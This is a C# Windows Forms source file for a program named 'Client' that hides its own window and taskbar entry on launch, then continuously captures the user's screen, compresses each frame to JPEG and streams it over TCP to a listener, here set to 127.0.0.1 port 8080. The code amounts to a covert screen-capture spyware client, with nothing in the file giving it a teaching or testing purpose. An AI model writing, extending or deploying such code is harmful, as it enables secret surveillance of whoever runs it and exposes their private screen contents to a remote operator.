using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Clinet
{
    public partial class Client : Form
    {
        [DllImport("user32.dll")]
        static extern private bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public Client()
        {
            InitializeComponent();
        }

        private void Client_Activated(object sender, EventArgs e)
        {
            ShowWindow(this.Handle, 0);
            this.ShowInTaskbar = false;
            this.Visible = false;
        }

        private void Client_Load(object sender, EventArgs e)
        {
            new Thread(() => {
                Thread.CurrentThread.IsBackground = true;

                TcpClient client = new TcpClient();
                try
                {
                    client.Connect("127.0.0.1", 8080);
                    NetworkStream n = client.GetStream();
                    BinaryWriter writer = new BinaryWriter(n);
                    int size = 0;

                    while (true)
                    {
                        ShowWindow(this.Handle, 0);
                        this.ShowInTaskbar = false;
                        this.Visible = false;

                        using (Bitmap bitmap = new Bitmap(1920, 1860))
                        {
                            Graphics g = Graphics.FromImage(bitmap);
                            g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                            byte[] bytes = bitTobin(bitmap);
                            size = bytes.Length;

                            writer.Write(size);
                            writer.Flush();
                            writer.Write(bytes, 0, size);
                            writer.Flush();
                        }
                    }
                } catch (Exception) { this.Close(); }
            }).Start();
        }

        private byte[] bitTobin(Bitmap bitmap)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap.Save(ms, ImageFormat.Jpeg);
                return ms.ToArray();
            }
        }
    }
}
